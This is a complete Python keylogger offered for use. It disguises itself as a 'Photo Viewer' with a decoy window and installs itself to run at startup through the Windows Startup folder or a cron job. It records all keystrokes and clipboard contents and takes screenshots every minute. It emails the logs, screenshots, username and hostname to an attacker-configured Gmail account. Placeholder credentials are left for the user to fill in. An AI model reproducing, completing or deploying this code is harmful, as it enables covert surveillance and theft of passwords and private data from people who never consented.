import pynput
from pynput.keyboard import Key, Listener
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import threading
import time
import os
import shutil
import getpass
import tkinter as tk
import pyautogui
import pyperclip
from datetime import datetime

# Config for email (replace these with your details)
EMAIL_ADDRESS = "your_email@gmail.com"  # Your Gmail address
EMAIL_PASSWORD = "your_app_password"    # Your Gmail App Password
TO_EMAIL = "receiver_email@gmail.com"  # Where logs are sent
LOG_FILE = "keylog.txt"  # Relative path (use /tmp/keylog.txt for Linux)
SEND_INTERVAL = 60  # Send email every 60 seconds
SCREENSHOT_INTERVAL = 60  # Take screenshot every 60 seconds

# Buffer to store keystrokes and clipboard content
keys = []
last_clipboard = None  # Track last clipboard content to avoid duplicates

def show_fake_gui():
    try:
        root = tk.Tk()
        root.title("Photo Viewer")
        root.geometry("300x100")
        label = tk.Label(root, text="Loading Photo Viewer...", font=("Arial", 12))
        label.pack(pady=20)
        root.update()
        time.sleep(3)  # Show GUI for 3 seconds
        root.destroy()
    except Exception as e:
        print(f"Error showing GUI: {e}")

def add_to_startup():
    file_location = ""
    try:
        if os.name == 'nt':  # Windows
            exe_path = os.path.abspath("PhotoViewer.exe")
            startup_path = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            shutil.copy(exe_path, startup_path)
            file_location = f"Original file: {exe_path}\nStartup copy: {os.path.join(startup_path, 'PhotoViewer.exe')}"
        else:  # Linux
            exe_path = os.path.abspath("PhotoViewer")
            cron_job = f"@reboot {exe_path}\n"
            with open("/tmp/keylogger_cron", "w") as f:
                f.write(cron_job)
            os.system("crontab /tmp/keylogger_cron")
            file_location = f"Original file: {exe_path}\nCron job added for startup."
        send_initial_location(file_location)
    except Exception as e:
        file_location = f"Error adding to startup: {e}"
        send_initial_location(file_location)

def send_initial_location(file_location):
    try:
        username = getpass.getuser()
        hostname = os.uname().nodename if os.name != 'nt' else os.environ['COMPUTERNAME']
        msg = MIMEText(f"Keylogger started.\nFile locations:\n{file_location}\nUsername: {username}\nHostname: {hostname}")
        msg['Subject'] = 'Keylogger Location Report'
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = TO_EMAIL
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, TO_EMAIL, msg.as_string())
    except Exception as e:
        print(f"Error sending location email: {e}")

def capture_screenshot():
    while True:
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            screenshot_path = f"screenshot_{timestamp}.png"
            pyautogui.screenshot().save(screenshot_path)
            send_screenshot(screenshot_path)
            os.remove(screenshot_path)  # Delete after sending
        except Exception as e:
            print(f"Error capturing screenshot: {e}")
        time.sleep(SCREENSHOT_INTERVAL)

def send_screenshot(screenshot_path):
    try:
        username = getpass.getuser()
        hostname = os.uname().nodename if os.name != 'nt' else os.environ['COMPUTERNAME']
        msg = MIMEMultipart()
        msg['Subject'] = 'Keylogger Screenshot'
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = TO_EMAIL
        msg.attach(MIMEText(f"Username: {username}\nHostname: {hostname}\n\nScreenshot captured at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"))

        with open(screenshot_path, "rb") as f:
            part = MIMEBase('image', 'png')
            part.set_payload(f.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(screenshot_path)}')
        msg.attach(part)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, TO_EMAIL, msg.as_string())
    except Exception as e:
        print(f"Error sending screenshot: {e}")

def on_press(key):
    global last_clipboard
    try:
        key_str = str(key).replace("'", "")
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        if key == Key.space:
            key_str = " "
        elif key == Key.enter:
            key_str = "[ENTER]"
        elif key == Key.tab:
            key_str = "[TAB]"
        elif key == Key.backspace:
            key_str = "[BACKSPACE]"
        elif key == Key.shift or key == Key.shift_r:
            key_str = "[SHIFT]"
        elif key == Key.ctrl_l or key == Key.ctrl_r:
            key_str = "[CTRL]"
        elif key == Key.alt_l or key == Key.alt_r:
            key_str = "[ALT]"
        elif key == Key.left:
            key_str = "[LEFT]"
        elif key == Key.right:
            key_str = "[RIGHT]"
        elif key == Key.up:
            key_str = "[UP]"
        elif key == Key.down:
            key_str = "[DOWN]"
        elif key == Key.esc:
            key_str = "[ESC]"
        elif key == Key.delete:
            key_str = "[DELETE]"
        elif key == Key.home:
            key_str = "[HOME]"
        elif key == Key.end:
            key_str = "[END]"
        elif key == Key.page_up:
            key_str = "[PAGE_UP]"
        elif key == Key.page_down:
            key_str = "[PAGE_DOWN]"
        elif str(key).startswith("Key."):
            key_str = f"[{key_str.replace('Key.', '')}]"
        elif len(key_str) == 3 and key_str.startswith("\\x"):
            control_codes = {
                "\\x03": "[CTRL+C]",
                "\\x16": "[CTRL+V]",
                "\\x17": "[CTRL+W]",
                "\\x18": "[CTRL+X]",
                "\\x19": "[CTRL+Y]",
                "\\x1a": "[CTRL+Z]"
            }
            key_str = control_codes.get(key_str, f"[UNKNOWN_{key_str}]")
            # Check clipboard on Ctrl+C or Ctrl+V
            if key_str in ["[CTRL+C]", "[CTRL+V]"]:
                try:
                    clipboard_content = pyperclip.paste()
                    if clipboard_content and clipboard_content != last_clipboard:
                        last_clipboard = clipboard_content
                        log_entry = f"{timestamp}: [CLIPBOARD] {clipboard_content}"
                        keys.append(log_entry)
                        with open(LOG_FILE, "a") as f:
                            f.write(log_entry + "\n")
                except Exception:
                    pass  # Ignore clipboard errors
        log_entry = f"{timestamp}: {key_str}"
        keys.append(log_entry)
        with open(LOG_FILE, "a") as f:
            f.write(log_entry + "\n")
    except Exception as e:
        print(f"Error logging key: {e}")

def send_email():
    while True:
        try:
            content = ""
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, "r") as f:
                    content = f.read()
            else:
                content = "No keystrokes logged yet."

            if content:
                username = getpass.getuser()
                hostname = os.uname().nodename if os.name != 'nt' else os.environ['COMPUTERNAME']
                msg = MIMEText(f"Username: {username}\nHostname: {hostname}\n\n{content}")
                msg['Subject'] = 'Keylog Update'
                msg['From'] = EMAIL_ADDRESS
                msg['To'] = TO_EMAIL
                with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
                    server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
                    server.sendmail(EMAIL_ADDRESS, TO_EMAIL, msg.as_string())

                if os.path.exists(LOG_FILE):
                    open(LOG_FILE, "w").close()

        except Exception as e:
            print(f"Error sending email: {e}")

        time.sleep(SEND_INTERVAL)

def main():
    # Start fake GUI in a separate thread
    gui_thread = threading.Thread(target=show_fake_gui)
    gui_thread.daemon = True
    gui_thread.start()

    # Start screenshot capture in a separate thread
    screenshot_thread = threading.Thread(target=capture_screenshot)
    screenshot_thread.daemon = True
    screenshot_thread.start()

    # Add to startup and send location
    add_to_startup()

    # Start email sender
    email_thread = threading.Thread(target=send_email)
    email_thread.daemon = True
    email_thread.start()

    # Start key listener
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
